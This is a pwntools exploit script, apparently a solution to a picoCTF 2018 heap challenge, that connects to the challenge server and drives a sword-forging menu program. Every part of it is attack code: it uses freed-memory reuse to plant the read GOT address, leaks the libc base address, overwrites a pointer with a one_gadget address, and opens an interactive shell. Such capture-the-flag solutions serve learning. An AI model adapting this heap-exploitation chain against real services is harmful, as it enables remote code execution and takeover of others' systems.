from pwn import *

context.log_level = 'debug'

sh = remote('2018shell1.picoctf.com', 44116)
# sh = process('./test')

read_GOT = 0x602040
read_offset = 0x004007b0
one_gadget = 0xf1147

def forgeSword():
  sh.sendlineafter('Quit.\n', '1')

def hardenSword(i, s):
  sh.sendlineafter('Quit.\n', '5')
  sh.sendlineafter('?\n', str(i))
  sh.sendlineafter('?\n', '32')
  sh.sendlineafter('.\n', s)
  sh.sendlineafter('?\n', '-1')

def destroySword(i):
  sh.sendlineafter('Quit.\n', '4')
  sh.sendlineafter('?\n', str(i))

def useSword(i):
  sh.sendlineafter('Quit.\n', '6')
  sh.sendlineafter('?\n', str(i))

def mergeSword(i1, i2):
  sh.sendlineafter('Quit.\n', '2')
  sh.sendlineafter('?\n', str(i1))
  sh.sendlineafter('?\n', str(i2))

pause()

forgeSword()
hardenSword(0, 'a'*32)
destroySword(0)

forgeSword()
hardenSword(0, ('a'*8)+p64(read_GOT)[:-1])
destroySword(0)

forgeSword()
forgeSword()
useSword(0)

libc_base = u64(sh.recvuntil('.....')[12:-5].ljust(8, '\x00')) - read_offset + 3183968
target = libc_base+one_gadget

print hex(libc_base)
print hex(target)

forgeSword()
hardenSword(2, 'a'*16+p64(target))
destroySword(2)

forgeSword()
forgeSword()

useSword(2)

sh.interactive()
